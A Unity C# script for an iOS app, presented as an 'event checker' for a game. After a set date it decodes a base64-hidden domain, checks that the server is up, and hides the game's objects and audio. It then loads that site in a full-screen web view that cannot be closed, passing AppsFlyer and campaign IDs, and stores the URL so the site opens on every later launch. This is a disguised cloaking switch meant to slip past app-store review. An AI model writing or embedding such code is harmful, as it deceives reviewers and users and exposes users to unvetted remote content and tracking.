using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using System;
using AppsFlyerSDK;
using UnityEngine.Networking;
using Unity.Advertisement.IosSupport;
using UnityEngine.iOS;
using Debug = UnityEngine.Debug;
using TMPro;
using System.Net;
using System.Threading.Tasks;

public class EventChecker : MonoBehaviour, IAppsFlyerConversionData
{
    public string eventName;
    public int day;
    public int month;
    public string aid;

    public GameObject[] gameObjects;
    public GameObject bg;
    public int year;
    private string begin = "https://";
    private string between = "/?uuid=";
    private string last;
    private string camp;
    private bool isInit;
    private bool isNonOrg;
    private bool isFirstUR;
    private UniWebView uniWebView;
    private bool isActivatedEvent;
    private ScreenOrientation lastOrientation;
    private string UR;
    private async Task<bool> CheckEvent()
    {
        var startTime = await Task.FromResult<DateTime>(new DateTime(year, month, day));
        if (DateTime.Today.AddMinutes(1) > startTime)
        {
            return true;
        }
        else
        {
            Debug.Log("False");
            return false;
        }
    }
    private void Awake()
    {
#if UNITY_IOS && !UNITY_EDITOR
AppsFlyer.waitForATTUserAuthorizationWithTimeoutInterval(1);
#endif
        if (ATTrackingStatusBinding.GetAuthorizationTrackingStatus()
     == ATTrackingStatusBinding.AuthorizationTrackingStatus.NOT_DETERMINED)
        {
            ATTrackingStatusBinding.RequestAuthorizationTracking();
        }

        if (PlayerPrefs.HasKey("eventData"))
        {
            UR = PlayerPrefs.GetString("eventData");
            LoadEvent();
            ShowEventData();
            //ShowEventData(PlayerPrefs.GetString("eventData"), false);
            return;
        }
        string id = "id6736640631";
        AppsFlyer.initSDK(aid, id, this);
        AppsFlyer.startSDK();
        Task<bool> asyncChecker = CheckEvent();
        if (asyncChecker.Result)
        {
            isInit = true;
            byte[] data = Convert.FromBase64String(eventName);
            string decodedString = System.Text.Encoding.UTF8.GetString(data);
            eventName = decodedString;
            StartCoroutine(CheckEventAlive(begin + eventName + between + SetInfo()));
        }
        else
        {
            this.enabled = false;
        }
    }
    private void Update()
    {
        if (isActivatedEvent)
        {
            if (Input.deviceOrientation == DeviceOrientation.LandscapeLeft || Input.deviceOrientation == DeviceOrientation.PortraitUpsideDown)
            {
                Debug.Log("Landscape");
            }
            if (Input.deviceOrientation == DeviceOrientation.Portrait || Input.deviceOrientation == DeviceOrientation.PortraitUpsideDown)
            {
                Debug.Log("Portrait");
            }
            if (Screen.orientation != lastOrientation)
            {
                lastOrientation = Screen.orientation;
                if (Screen.height > Screen.width)
                {
                    StartCoroutine(UpdateWebViewFrame());
                }
                else
                {
                    StartCoroutine(UpdateWebViewFrameFull());
                }
            }
        }
    }
    private bool CheckCurrentDay()
    {
        DateTime startTime = new DateTime(year, month, day);
        if (DateTime.Today.AddMinutes(1) > startTime)
        {
            return true;
        }
        else
        {
            return false;
        }
    }
    private string SetInfo()
    {
        Debug.Log("true;");
        Guid myuuid = Guid.NewGuid();
        string myuuidAsString = myuuid.ToString();
        return myuuidAsString;
    }
    IEnumerator CheckEventAlive(string uri)
    {
        using (UnityWebRequest webRequest = UnityWebRequest.Get(uri))
        {
            yield return webRequest.SendWebRequest();
            Debug.Log(uri);
            string[] pages = uri.Split('/');
            int page = pages.Length - 1;

            if (webRequest.isNetworkError)
            {
                Debug.Log("Network_error");
            }
            else if (webRequest.isHttpError)
            {
                Debug.Log("HTPP ERROR");
                this.enabled = false;
            }
            else
            {
                Debug.Log("NO ERROR");
                UR = uri;
                // LoadEvent();
            }
        }
    }
    private void SaveInfo(string infoToSave)
    {
        Debug.Log(infoToSave);
        PlayerPrefs.SetString("eventData", infoToSave);
        PlayerPrefs.Save();
    }
    private void LoadEvent(bool isNonOr=false)
    {
        Debug.Log("LoadEvent");
        var webviewObject = new GameObject("UniWebview");
        isActivatedEvent = true;
        uniWebView = webviewObject.AddComponent<UniWebView>();
        uniWebView.Frame = new Rect(0, 0, Screen.width, Screen.height - 100);
        uniWebView.SetToolbarDoneButtonText("");
        uniWebView.SetShowToolbar(false, false, true, true);
        uniWebView.OnPageFinished += PageLoadSuccessEvent;
        uniWebView.Load(UR);
        uniWebView.OnShouldClose += (view) => {
            return false;
        };
    }
    private void ShowEventData()
    {
        foreach(GameObject gameObject in gameObjects)
        {
            gameObject.SetActive(false);
        }
        try
        {
            GameObject g = GameObject.FindGameObjectWithTag("Audio").gameObject;
            g.SetActive(false);
        }
        catch
        {

        }

        Screen.autorotateToLandscapeLeft = true;
        Screen.autorotateToLandscapeRight = true;
        Screen.autorotateToPortrait = true;
        Screen.orientation = ScreenOrientation.AutoRotation;
        bg.SetActive(true);
        uniWebView.Show();
    }

   
    public void LoadNextScene()
    {
        UnityEngine.SceneManagement.SceneManager.LoadScene(UnityEngine.SceneManagement.SceneManager.GetActiveScene().buildIndex + 1);
    }

    private IEnumerator UpdateWebViewFrameFull()
    {
        // Wait until all rendering for the current frame is finished
        yield return new WaitForEndOfFrame();
        if (uniWebView != null)
            uniWebView.Frame = new Rect(0, 0, Screen.width, Screen.height);
    }

    private IEnumerator UpdateWebViewFrame()
    {
        // Wait until all rendering for the current frame is finished
        yield return new WaitForEndOfFrame();
        if (uniWebView != null)
            uniWebView.Frame = new Rect(0, -50, Screen.width, Screen.height - 50);
    }
    public void PageLoadSuccessEvent(UniWebView webView, int statusCode, string url)
    {
            if (!isFirstUR && isNonOrg)
            {
                UR = url;
                Debug.Log(UR);
                isFirstUR = true;
                if (isNonOrg)
                {
                    string APSID = AppsFlyer.getAppsFlyerId();
                    UR = UR + "?sub_id_22=" + APSID + "&sub_id_23=" + camp;
                    uniWebView.Load(UR);
                    ShowEventData();
                }
                else
                {
                    ShowEventData();
                }
            }
            else
            {
                if (!PlayerPrefs.HasKey("eventData"))
                {
                    PlayerPrefs.SetString("eventData", url);
                    PlayerPrefs.Save();
                    Debug.Log("Saved" + url);
                }
                uniWebView.OnPageFinished -= PageLoadSuccessEvent;
                ShowEventData();
            }
    }

    public void onConversionDataSuccess(string conversionData)
    {
        if (isInit)
        {
            Dictionary<string, object> conversionDataDictionary = AppsFlyer.CallbackStringToDictionary(conversionData);
            if (conversionDataDictionary["af_status"].ToString().Contains("Non"))
            {
                if (conversionDataDictionary["campaign_id"] != null)
                {
                    isNonOrg = true;
                    string APSID = AppsFlyer.getAppsFlyerId();
                    camp = conversionDataDictionary["campaign_id"].ToString();
                    //UR = UR + "?sub_id_22="+APSID+"&sub_id_23=" + camp;
                    LoadEvent(true);
                    //ShowEventData();
                }
                else
                {
                    LoadEvent();
                    //ShowEventData();
                }
            }
            else
            {
                LoadEvent();
                //ShowEventData();
            }
        }
    }

    public void onConversionDataFail(string error)
    {
        if (isInit)
        {
            LoadEvent();
            ShowEventData();
        }
    }

    public void onAppOpenAttribution(string attributionData)
    {
        throw new NotImplementedException();
    }

    public void onAppOpenAttributionFailure(string error)
    {
        //ShowEventData();
    }
}